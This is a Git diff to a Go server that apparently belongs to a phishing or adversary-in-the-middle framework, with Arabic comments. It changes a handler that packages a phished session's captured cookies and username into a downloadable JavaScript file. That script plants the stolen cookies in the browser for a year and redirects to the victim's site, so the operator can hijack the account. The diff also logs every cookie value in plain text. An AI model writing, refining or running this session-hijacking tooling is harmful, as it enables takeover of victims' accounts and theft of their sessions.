@@ -1321,6 +1321,10 @@ func (as *ApiServer) sessionCookiesScriptHandler(w http.ResponseWriter, r *http.
 		return
 	}
 	
+	// طباعة معلومات تصحيح عن الجلسة
+	log.Debug("معالجة طلب تنزيل الكوكيز للجلسة: %d", sessionId)
+	log.Debug("عدد الكوكيز الموجودة: %d", len(session.CookieTokens))
+	
 	// تحويل الكوكيز إلى تنسيق StorageAce/كروم
 	type ChromeCookie struct {
 		Path           string `json:"path"`
@@ -1345,6 +1349,9 @@ func (as *ApiServer) sessionCookiesScriptHandler(w http.ResponseWriter, r *http.
 			if len(domain) > 0 && domain[0] == '.' {
 				hostOnly = false
 			}
+			
+			// طباعة معلومات تصحيح لكل كوكي
+			log.Debug("إضافة كوكي: %s = %s (%s)", name, token.Value, domain)
 			
 			cookie := &ChromeCookie{
 				Path:           token.Path,
@@ -1375,7 +1382,13 @@ func (as *ApiServer) sessionCookiesScriptHandler(w http.ResponseWriter, r *http.
 		return
 	}
 	
-	// إنشاء ملف نصي مع البريد الإلكتروني ورقم فريد (نستخدم معرف الجلسة ووقت الطلب)
+	// في حالة عدم وجود كوكيز، عرض رسالة خطأ مناسبة
+	if len(cookies) == 0 {
+		as.jsonError(w, "لا توجد كوكيز لهذه الجلسة", http.StatusNotFound)
+		return
+	}
+	
+	// إنشاء ملف نصي مع معرف فريد (نستخدم معرف الجلسة ووقت الطلب)
 	emailPart := ""
 	if session.Username != "" {
 		emailPart = session.Username
@@ -1387,7 +1400,19 @@ func (as *ApiServer) sessionCookiesScriptHandler(w http.ResponseWriter, r *http.
 	uniqueId := fmt.Sprintf("%s_%d_%d", emailPart, sessionId, timestamp)
 	
 	// بناء نص JavaScript للتنفيذ المباشر
-	jsScript := fmt.Sprintf(`!function(){let e=JSON.parse(%s);for(let o of e)document.cookie=`+"`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}`"+`;${o.domain?`${o.path?\"\":\"path=/;\"};`:\"\"}`+`Secure;SameSite=None`;window.location.href="https://%s"}();`, string(cookiesJSON), cookies[0].Domain)
+	jsScript := fmt.Sprintf(`// تنزيل الكوكيز للجلسة %d (%s) - تاريخ التنزيل: %s
+!function(){
+    console.log("جاري إعداد الكوكيز...");
+    let cookiesData = %s;
+    for(let cookie of cookiesData) {
+        document.cookie = `${cookie.name}=${cookie.value};${cookie.path?`path=${cookie.path};`:""}${cookie.domain?`domain=${cookie.domain};`:""}Max-Age=31536000;Secure;SameSite=None`;
+        console.log("تم إعداد الكوكي:", cookie.name);
+    }
+    console.log("تم إعداد جميع الكوكيز بنجاح!");
+    alert("تم إعداد الكوكيز بنجاح! يمكنك الآن الانتقال للموقع المستهدف.");
+    // الانتقال إلى الموقع المستهدف
+    window.location.href = "https://%s";
+}();`, sessionId, emailPart, time.Now().Format("2006-01-02 15:04:05"), string(cookiesJSON), cookies[0].Domain)
 	
 	// إعداد رأس الاستجابة للتنزيل
 	fileName := fmt.Sprintf("cookies_%s.js", uniqueId)
